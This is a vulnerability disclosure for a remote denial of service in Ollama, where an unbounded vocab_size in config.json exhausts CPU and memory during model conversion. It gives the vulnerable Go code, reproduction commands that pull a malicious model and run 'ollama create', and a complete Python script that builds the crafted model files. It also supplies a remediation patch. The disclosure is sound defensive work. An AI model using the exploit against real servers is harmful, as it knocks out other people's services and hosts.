# Remote Denial of Service in Ollama via Unbounded `vocab_size`

> **Disclosure Note**
>
> Originally reported via Huntr and publicly disclosed after the disclosure period:
>
> https://huntr.com/bounties/119cfda6-383c-4d57-8d07-6fe308fdc1c2
>
> Re-tested against **Ollama v0.30.11** and observed the same resource-exhaustion behavior.

---

## Summary

A remote denial-of-service vulnerability exists in Ollama's model loading logic. The `LoadModelMetadata` function reads `vocab_size` from a user-controlled `config.json` file without enforcing an upper bound. When an extremely large value is provided (e.g., 1 Billion), the function enters an unbounded loop that performs millions of string formatting and slice append operations, rapidly consuming all available system memory and CPU cycles.

This leads to a complete denial of service — the Ollama server becomes unresponsive and the underlying host system may become unstable due to OOM conditions.

---

## Severity

- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** None
- **User Interaction:** None
- **Availability Impact:** High

---

## Affected Versions

Originally confirmed on Ollama **0.18.1**.

The issue was also reproduced during testing on **Ollama v0.30.11**.

---

## Root Cause

In `convert/convert.go`:

```go
func LoadModelMetadata(fsys fs.FS) (ModelKV, *Tokenizer, error) {
    // ... [1] Load config.json and get vocabSize
    vocabSize := int(cmp.Or(p.VocabSize, p.TextModel.VocabSize))

    // ...
    case vocabSize > len(t.Vocabulary.Tokens):
        // [2] Unbounded loop based on untrusted vocabSize
        for i := range vocabSize - len(t.Vocabulary.Tokens) {
            t.Vocabulary.Tokens = append(t.Vocabulary.Tokens, fmt.Sprintf("[PAD%d]", i))
            t.Vocabulary.Scores = append(t.Vocabulary.Scores, -1)
            t.Vocabulary.Types = append(t.Vocabulary.Types, tokenTypeUserDefined)
        }
    // ...
}
```

At `[1]`, `vocabSize` is taken directly from the user-controlled `config.json`.

At `[2]`, the code iterates from the current token count up to `vocabSize`.

Each iteration allocates new strings and grows multiple slices, leading to excessive memory consumption and eventual OOM conditions.

---

## Attack Flow

1. **Provide Malicious Model:** Attacker provides a model directory (or uploads via API) containing a `config.json` with `"vocab_size": 1000000000`
2. **Trigger Loading:** Attacker calls `POST /api/create` referencing the malicious model
3. **Resource Exhaustion:** Ollama enters the unbounded vocabulary-padding loop, consuming 100% CPU and all available RAM
4. **System Impact:** The server becomes unresponsive and the host system may crash due to OOM

---

## Proof of Concept

### Reproduction Steps

```bash
git clone https://huggingface.co/regaan/malicious_model
cd malicious_model
echo "FROM ." > Modelfile
ollama create exploit-vocab -f Modelfile
```

The Ollama server will occupy 100% CPU and rapidly consume all available RAM as it attempts to pad the vocabulary to 1 Billion tokens.

This leads to severe system lag and eventually a crash or OOM-kill of the process.

### Evidence of Impact

The attacker initiates the exploit remotely.

The CLI hangs at `converting model` as the remote server enters the resource-exhaustion loop.

> **Screenshot 1: Remote Attack Execution**

<img width="1084" height="397" alt="1" src="https://github.com/user-attachments/assets/dd8a473d-9c66-4429-8de7-551d3e08e01a" />

On the target server, the `ollama` process immediately consumes nearly all available CPU resources while memory usage continuously increases.

Swap usage begins increasing as the system attempts to cope with memory pressure.

> **Screenshot 2: Resource Exhaustion on the Target Host**

<img width="1920" height="1200" alt="2" src="https://github.com/user-attachments/assets/498670ef-238b-4472-85a2-cd3eb6e5779b" />

---

### Exploit Generation Script

```python
import json
import os
import struct

def generate_exploit_vocab(model_dir):
    os.makedirs(model_dir, exist_ok=True)

    # Maliciously large vocab_size
    config = {
        "architectures": ["LlamaForCausalLM"],
        "vocab_size": 1000000000
    }

    with open(os.path.join(model_dir, "config.json"), "w") as f:
        json.dump(config, f)

    # Dummy tokenizer
    tokenizer = {
        "model": {
            "type": "BPE",
            "vocab": {"[UNK]": 0}
        }
    }

    with open(os.path.join(model_dir, "tokenizer.json"), "w") as f:
        json.dump(tokenizer, f)

    # Dummy tensor file to satisfy discovery
    header = json.dumps({"__metadata__": {"foo": "bar"}}).encode("utf-8")

    with open(os.path.join(model_dir, "model.safetensors"), "wb") as f:
        f.write(
            struct.pack("<Q", len(header))
            + header
            + b"\x00" * 100
        )

generate_exploit_vocab("malicious_model")
```

---

## Impact

An attacker can remotely cause a complete denial of service by providing a malformed model configuration.

The attack leads to:

- **100% CPU consumption** during the vocabulary-padding loop
- **Unbounded memory growth** until OOM
- **Swap exhaustion**
- **System-wide instability**
- **Complete loss of availability** for all Ollama users
- **Potential OOM termination of the Ollama process**

---

## Vulnerable File

| File | Function |
|--------|----------|
| `convert/convert.go` | `LoadModelMetadata()` |

---

## Recommended Remediation

```go
func LoadModelMetadata(fsys fs.FS) (ModelKV, *Tokenizer, error) {
    vocabSize := int(cmp.Or(p.VocabSize, p.TextModel.VocabSize))

    // Enforce a sane maximum vocab size
    const maxVocabSize = 10_000_000

    if vocabSize > maxVocabSize {
        return ModelKV{}, nil,
            fmt.Errorf(
                "vocab_size %d exceeds maximum allowed %d",
                vocabSize,
                maxVocabSize,
            )
    }

    // Existing logic
}
```

Additional defensive measures:

- Allocation budgeting
- Metadata validation during import
- Resource quotas during model conversion
- Request throttling for model creation endpoints

---

## Conclusion

The absence of bounds checking on `vocab_size` allows attacker-controlled model metadata to drive excessive memory allocation and CPU consumption.

By supplying an artificially large vocabulary size, an attacker can force Ollama into a prolonged resource-exhaustion state, resulting in denial of service and host instability.

Strict validation of model metadata before allocation or iteration eliminates the issue and prevents abuse through malicious model files.

---

## References

- Huntr Disclosure:
  https://huntr.com/bounties/119cfda6-383c-4d57-8d07-6fe308fdc1c2

- Ollama:
  https://github.com/ollama/ollama

---

## Researcher

**Regaan** — Independent Security Researcher

- GitHub: https://github.com/regaan
- Website: https://rothackers.com
- ORCID: https://orcid.org/0009-0006-3683-7824
